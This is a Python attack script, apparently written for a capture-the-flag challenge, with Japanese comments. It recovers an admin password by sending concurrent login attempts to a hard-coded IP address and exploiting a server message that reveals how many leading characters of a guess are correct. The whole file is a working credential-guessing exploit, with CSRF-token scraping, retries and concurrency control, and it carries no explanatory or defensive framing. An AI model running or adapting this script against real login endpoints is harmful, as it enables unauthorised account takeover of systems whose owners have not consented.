# get_admin.py
import asyncio, re, string, aiohttp
from aiohttp import ClientTimeout, ClientConnectionError, ServerDisconnectedError

BASE = "http://52.59.124.14:5015"   # ←環境に合わせて
LOGIN_PATH = "/login.php"        # ←あなたの環境はこれでOKとのこと
USERNAME = "admin"

# 文字集合は必要に応じて追加
ALPH = (
        string.ascii_lowercase + string.digits +
        string.ascii_uppercase + "_{}!@#$%^&*()-+=.:;?, "
                                 "'\"`~[]\\|/<>"
)

# ★ このサイトのメッセージにドンピシャの正規表現
RX_HIT = re.compile(r"Invalid password,\s*but you got\s+(\d+)\s+characters\s+correct!?",
                    re.I)

CONC_LIMIT = 12                                  # サーバに優しく
TIMEOUT = ClientTimeout(total=12, connect=5, sock_read=7)
RETRIES = 3

async def fetch_csrf(session):
    # CSRF が無ければ None のままでOK
    async with session.get(f"{BASE}{LOGIN_PATH}", allow_redirects=True, timeout=TIMEOUT) as r:
        html = await r.text()
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html, re.I)
    return m.group(1) if m else None

def parse_count(html: str) -> int | None:
    m = RX_HIT.search(html)
    return int(m.group(1)) if m else None

async def post_with_retry(session, pwd, csrf=None):
    data = {"username": USERNAME, "password": pwd}
    if csrf is not None:
        data["csrf"] = csrf
    last_exc = None
    for i in range(RETRIES):
        try:
            async with session.post(
                    f"{BASE}{LOGIN_PATH}",
                    data=data,
                    allow_redirects=True,
                    timeout=TIMEOUT,
                    headers={"Referer": f"{BASE}{LOGIN_PATH}", "Accept-Encoding": "identity"},
            ) as r:
                text = await r.text()
                # 成功の合図（必要なら増やす）
                if ("Dashboard" in text) or ("Logout" in text) or ("Welcome" in text):
                    return True, None
                print(text)
                return False, parse_count(text)
        except (asyncio.TimeoutError, ClientConnectionError, ServerDisconnectedError) as e:
            last_exc = e
            await asyncio.sleep(0.2 * (2 ** i))
    raise last_exc

async def try_round(session, prefix, bucket, csrf):
    sem = asyncio.Semaphore(CONC_LIMIT)
    tasks = []

    async def worker(ch):
        async with sem:
            ok, cnt = await post_with_retry(session, prefix + ch, csrf=csrf)
            print(cnt)
        return ch, ok, cnt

    for ch in bucket:
        tasks.append(asyncio.create_task(worker(ch)))

    winner = None
    try:
        for fut in asyncio.as_completed(tasks):
            ch, ok, cnt = await fut
            if ok:
                return prefix + ch, True
            if cnt == len(prefix) + 1:
                winner = ch
                break
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()

    if winner:
        return prefix + winner, False
    return None, False

async def find_password():
    connector = aiohttp.TCPConnector(limit_per_host=CONC_LIMIT, ssl=False, force_close=False)
    async with aiohttp.ClientSession(connector=connector,
                                     headers={"Connection": "keep-alive",
                                              "User-Agent": "ctf-bf/1.2"}) as session:
        prefix = ""
        while True:
            csrf = await fetch_csrf(session)  # CSRFが単発型でも毎ラウンド更新で安全
            nxt, done = await try_round(session, prefix, ALPH, csrf)
            if nxt is None:
                raise RuntimeError("stalled: メッセージ/CSRF/ユーザー名/エンドポイントを再確認してください。")
            prefix = nxt
            print("→", prefix)
            if done:
                return prefix

if __name__ == "__main__":
    pw = asyncio.run(find_password())
    print("PASSWORD =", pw)
